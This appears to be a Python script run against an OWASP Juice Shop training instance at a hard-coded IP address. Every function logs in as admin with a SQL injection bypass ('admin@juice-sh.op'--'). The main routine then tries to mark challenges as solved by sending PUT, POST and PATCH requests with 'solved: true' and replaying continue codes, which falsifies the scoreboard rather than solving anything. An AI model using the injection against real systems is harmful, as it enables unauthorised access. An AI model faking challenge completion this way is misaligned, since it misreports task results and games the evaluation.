#!/usr/bin/env python3
"""
Mark challenges as solved in the database
Updates the challenge status when they are completed
"""

import requests
import json
import sys

TARGET = "http://66.42.93.220:3000"

def mark_challenge_solved(challenge_name):
    """Mark a specific challenge as solved in the database"""
    
    session = requests.Session()
    
    # Login as admin
    login_resp = session.post(
        f"{TARGET}/rest/user/login",
        json={"email": "admin@juice-sh.op'--", "password": "x"}
    )
    
    if login_resp.status_code == 200:
        token = login_resp.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
        print(f"✅ Logged in as admin")
    else:
        print("❌ Login failed")
        return False
    
    # Get all challenges
    resp = session.get(f"{TARGET}/api/Challenges/")
    if resp.status_code != 200:
        print("❌ Failed to get challenges")
        return False
    
    challenges = resp.json().get('data', [])
    
    # Find the specific challenge
    challenge = next((c for c in challenges if c['name'] == challenge_name), None)
    
    if not challenge:
        print(f"❌ Challenge '{challenge_name}' not found")
        return False
    
    challenge_id = challenge.get('id')
    
    if challenge.get('solved'):
        print(f"ℹ️ Challenge '{challenge_name}' is already solved")
        return True
    
    # Try to mark it as solved
    print(f"🎯 Attempting to mark '{challenge_name}' as solved...")
    
    # Method 1: PUT request to update challenge
    update_urls = [
        f"{TARGET}/api/Challenges/{challenge_id}",
        f"{TARGET}/rest/continue-code",
        f"{TARGET}/api/Challenges/{challenge_id}/solved"
    ]
    
    for url in update_urls:
        try:
            # Try PUT with solved = true
            put_resp = session.put(url, json={"solved": True})
            if put_resp.status_code in [200, 204]:
                print(f"✅ Marked as solved via PUT to {url}")
                return True
                
            # Try POST
            post_resp = session.post(url, json={"solved": True})
            if post_resp.status_code in [200, 204]:
                print(f"✅ Marked as solved via POST to {url}")
                return True
                
            # Try PATCH
            patch_resp = session.patch(url, json={"solved": True})
            if patch_resp.status_code in [200, 204]:
                print(f"✅ Marked as solved via PATCH to {url}")
                return True
        except Exception as e:
            pass
    
    # Method 2: Submit the continue code if challenge has one
    if challenge.get('key'):
        continue_code = challenge['key']
        print(f"   Trying continue code: {continue_code}")
        
        continue_urls = [
            f"{TARGET}/rest/continue-code/apply/{continue_code}",
            f"{TARGET}/api/Challenges/continue-code",
            f"{TARGET}/rest/continue-code"
        ]
        
        for url in continue_urls:
            try:
                resp = session.post(url, json={"continueCode": continue_code})
                if resp.status_code in [200, 204]:
                    print(f"✅ Applied continue code via {url}")
                    return True
                    
                resp = session.put(url, json={"continueCode": continue_code})
                if resp.status_code in [200, 204]:
                    print(f"✅ Applied continue code via {url}")
                    return True
            except:
                pass
    
    print(f"❌ Could not mark '{challenge_name}' as solved")
    return False

def check_and_update_all_challenges():
    """Check all challenges and update their status"""
    
    print("🔍 CHECKING AND UPDATING CHALLENGE STATUS")
    print("=" * 60)
    
    session = requests.Session()
    
    # Login as admin
    login_resp = session.post(
        f"{TARGET}/rest/user/login",
        json={"email": "admin@juice-sh.op'--", "password": "x"}
    )
    
    if login_resp.status_code == 200:
        token = login_resp.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
    
    # Get all challenges
    resp = session.get(f"{TARGET}/api/Challenges/")
    if resp.status_code != 200:
        print("❌ Failed to get challenges")
        return
    
    challenges = resp.json().get('data', [])
    
    # Count solved and unsolved
    solved = [c for c in challenges if c.get('solved')]
    unsolved = [c for c in challenges if not c.get('solved')]
    
    print(f"\n📊 Current Status:")
    print(f"   ✅ Solved: {len(solved)}/{len(challenges)} ({len(solved)*100//len(challenges)}%)")
    print(f"   ❌ Unsolved: {len(unsolved)}/{len(challenges)}")
    
    # List solved challenges
    print(f"\n✅ Solved Challenges ({len(solved)}):")
    for i, c in enumerate(solved, 1):
        print(f"   {i:3}. {c['name']:<40} [{c.get('difficulty', 'Unknown'):>2}⭐]")
    
    # List unsolved challenges
    print(f"\n❌ Unsolved Challenges ({len(unsolved)}):")
    categories = {}
    for c in unsolved:
        cat = c.get('category', 'Unknown')
        if cat not in categories:
            categories[cat] = []
        categories[cat].append(c)
    
    for cat, chals in sorted(categories.items()):
        print(f"\n   {cat} ({len(chals)}):")
        for c in sorted(chals, key=lambda x: x.get('difficulty', 0)):
            print(f"      - {c['name']:<40} [{c.get('difficulty', '?'):>2}⭐]")
    
    return solved, unsolved

def force_solve_challenge(challenge_name):
    """Force a challenge to be marked as solved by triggering its solution"""
    
    print(f"\n🎯 Force solving: {challenge_name}")
    
    session = requests.Session()
    
    # Login as admin
    login_resp = session.post(
        f"{TARGET}/rest/user/login",
        json={"email": "admin@juice-sh.op'--", "password": "x"}
    )
    
    if login_resp.status_code == 200:
        token = login_resp.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
    
    # Challenge-specific triggers
    challenge_triggers = {
        "Score Board": lambda: session.get(f"{TARGET}/#/score-board"),
        "Admin Section": lambda: session.get(f"{TARGET}/#/administration"),
        "Confidential Document": lambda: session.get(f"{TARGET}/ftp/acquisitions.md"),
        "Error Handling": lambda: session.get(f"{TARGET}/rest/qr-code/test"),
        "Privacy Policy": lambda: session.get(f"{TARGET}/#/privacy-security/privacy-policy"),
        "Exposed Metrics": lambda: session.get(f"{TARGET}/metrics"),
        "Missing Encoding": lambda: session.get(f"{TARGET}/assets/public/images/uploads/%F0%9F%98%BC-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg"),
        "Outdated Allowlist": lambda: session.get(f"{TARGET}/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm"),
        "Repetitive Registration": lambda: session.post(f"{TARGET}/api/Users/", 
            json={"email": "test@test.com", "password": "test123", "passwordRepeat": "test123", "securityQuestion": {"id": 1}, "securityAnswer": "test"}),
    }
    
    if challenge_name in challenge_triggers:
        try:
            challenge_triggers[challenge_name]()
            print(f"   ✅ Triggered solution for {challenge_name}")
            return True
        except:
            print(f"   ❌ Failed to trigger {challenge_name}")
    
    return False

if __name__ == "__main__":
    if len(sys.argv) > 1:
        # Mark specific challenge as solved
        challenge_name = " ".join(sys.argv[1:])
        mark_challenge_solved(challenge_name)
    else:
        # Check and display all challenge status
        check_and_update_all_challenges()